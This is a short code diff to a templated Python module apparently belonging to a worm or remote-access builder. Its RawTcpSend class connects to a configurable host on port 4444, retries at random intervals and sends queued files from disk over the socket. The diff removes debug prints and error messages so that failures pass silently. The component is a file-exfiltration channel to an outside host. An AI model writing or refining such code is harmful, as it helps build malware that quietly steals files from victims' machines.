@@ -9,7 +9,7 @@
 #!Var##RTC_port##4444##Host port number.##str
 #!Var##RTC_encode##$SOCKET_ENCODE##Socket encode format##str
 
-{% set RAW_TCP_SEND_ENCODE_COUNT = 12 %}
+{% set RAW_TCP_SEND_ENCODE_COUNT = 8 %}
 
 
 import base64
@@ -57,7 +57,6 @@ class RawTcpSend:
         self._is_conn = False
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            print("Try Conn")
             self.client.connect(self.addr)
             self._is_conn = True
             return True
@@ -68,7 +67,6 @@ class RawTcpSend:
         while self.worm.FLAG_working:
             if self._connect():
                 self.client.settimeout(3)
-                print("Connected")
                 self._recive()
             sleep(randint(2, 6))
     
@@ -100,8 +98,7 @@ class RawTcpSend:
         try:
             with open(fpath, "rb") as file:
                 self.client.sendfile(file, 0)
-        except Exception as e:
-            print("ERROR SEND FILE: ", e)
+        except:
             pass
     
     def send_msg(self, msg: str, *args, **kwargs) -> None:
@@ -120,14 +117,12 @@ class RawTcpSend:
         while self.worm.FLAG_working:
             too_send = self.input_send_file.get()
             sleep(self.pause_send)
-            print("TOO SEND: ", too_send)
             if self.is_conn:
                 self._send_file(too_send)
             else:
                 self.wait4conn(too_send)
 
     def start(self) -> None:
-        print("RawTcpSend Starting")
         work = threading.Thread(target=self.working, daemon=True)
         work.start()
         self._conn()
